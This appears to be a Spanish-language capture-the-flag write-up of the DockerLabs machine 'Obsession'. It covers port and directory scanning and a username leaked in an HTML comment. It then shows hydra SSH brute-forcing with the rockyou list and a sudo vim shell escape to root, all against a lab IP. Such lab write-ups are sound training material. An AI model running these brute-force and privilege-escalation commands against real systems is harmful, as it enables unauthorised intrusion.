# Obsession - DockerLab

Plataforma:** DockerLabs

**IP objetivo:** 172.17.0.2

**Dificultad:** Very easy

---
## Recon

### Reconocimiento de hosts

```bash
arp-scan -I eth0 --localnet
```

### Escaneo de puertos

```bash
nmap -sS -p- -sV -O --open --min-rate 5000 -n -oN scan 172.17.0.2
```

![Escaneo Nmap](screenshots/01-nmap-scan.png)

|Puerto|Servicio|
|---|---|
|21|FTP|
|22|SSH|
|80|HTTP|

### Puerto 80

Abrimos puerto 80 a través del navegador:

![Web principal](screenshots/02-web-home.png)

Encontrada web `The Aesthetic Dream`.

### Código fuente

![Comentario en código fuente](screenshots/03-source-code-comment.png)

Encontramos comentario interesante.

**Nombre de usuario:** `russoski`

### Searchsploit

```bash
searchsploit vsftpd 3.0.5
searchsploit openssh 9.6p1
searchsploit Apache 2.4.58
```

![Resultados searchsploit Apache](screenshots/04-searchsploit-apache.png)

Encontramos exploits disponibles para la versión de Apache detectada.

### Fuzzing dirb

```bash
dirb http://172.17.0.2
```

![Resultados dirb](screenshots/05-dirb-scan.png)

Encontrados 2 subdirectorios.

#### /important

![Página /important](screenshots/06-important-page.png)

Lleva a un manifiesto hacker sin nada relevante.

#### /backup

![Página /backup](screenshots/07-backup-page.png)

Volvemos a encontrarnos con el usuario `russoski`.

## Vulns

- Credenciales SSH débiles del usuario `russoski`, expuesto mediante código fuente HTML y directorio `/backup`.
- Privilegio sudo mal configurado sobre `vim`, explotable vía GTFOBins para escalada a root.

## Xploit

### Fuerza bruta SSH

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![Resultado Hydra](screenshots/08-hydra-ssh-bruteforce.png)

**Contraseña:** `iloveme`

### Conexión SSH

```bash
ssh russoski@172.17.0.2
```

![Shell SSH obtenida](screenshots/09-ssh-shell.png)

Tenemos shell.

## Privesc

```bash
sudo -l
```

![Salida sudo -l](screenshots/10-sudo-l.png)

```bash
sudo vim -c ':!/bin/sh'
```

![Shell root vía vim](screenshots/11-sudo-vim-root.png)

Somos root.
